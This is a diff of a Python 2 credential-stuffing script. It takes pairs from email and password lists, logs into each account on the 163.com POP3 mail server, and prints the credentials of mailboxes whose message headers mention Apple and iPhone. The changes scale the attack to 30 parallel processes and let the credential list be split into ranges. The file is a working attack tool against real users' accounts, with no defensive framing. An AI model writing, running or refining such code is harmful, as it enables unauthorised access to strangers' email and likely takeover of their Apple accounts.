@@ -1,25 +1,23 @@
 #!/usr/bin/env python
 
 import poplib
+import linecache
+import sys
+import time
 
-# global variables
-keywords = 'apple'
-thread_num = 10
-
-# multi-threads
-from Queue import Queue
-from threading import Thread
+process_num = 30
+# multi-processes
+from multiprocessing import Process, Queue
 class Worker(object):
 	def __init__(self, queue):
 		self.queue = queue
-		self.thread_num = thread_num
+		self.process_num = process_num
 		self.count = 0
 
 	def start(self):
-		for i in range(self.thread_num):
-			t = Thread(target = self.run)
-			t.setDaemon(True)
-			t.start()
+		for i in range(self.process_num):
+			p = Process(target = self.run)
+			p.start()
 
 	def run(self):
 		while True:
@@ -28,20 +26,20 @@ class Worker(object):
 			print self.count,' ',user['username']
 			server = poplib.POP3('pop3.163.com')
 			try:
-				server.user(user['username'])
-				server.pass_(user['password'])
+				name = user['username']
+				passwd = user['password']
+				server.user(name)
+				server.pass_(passwd)
 				server.noop()
 				count = 0
 				for i in server.list()[1]:
 					count += 1
-					head = server.top(i,1)[1][0]
-					if head.find(keywords) > -1:
-						print 'apple msg recieved : '.user['username']
-						break
-					elif count >= 20:
+					head = str(server.top(i,1)[1]).upper()
+					if head.find('APPLE') > -1 and head.find('IPHONE') > -1:
+						print 'apple msg recieved : ',name,' ',passwd
 						break
 			except Exception, e:
-				print user['username'],'get exception'
+				print user['username'],'get exception : ',e
 			
 			if self.queue.empty():
 				break
@@ -49,20 +47,28 @@ class Worker(object):
 if __name__ == '__main__':
 	queue = Queue()
 
+	start = int(sys.argv[1])
+	end = int(sys.argv[2])
+
 	emails = open('emails.txt')
 	passwords = open('passwords.txt')
+	
+	for i in xrange(start):
+		email = emails.readline()
+		password = passwords.readline()
 
 	email = emails.readline()
 	password = passwords.readline()
-	while email and password:
-		email = emails.readline()
-		password = passwords.readline()
+	while email and password and start <= end:
 		user = {'username':email.strip(),'password':password.strip()}
 		queue.put(user)
+		start += 1
+		email = emails.readline()
+		password = passwords.readline()
 
-	print queue.qsize()
 	Worker(queue).start()
-	queue.join()
+	while not queue.empty():
+		time.sleep(10)
 
 
 	
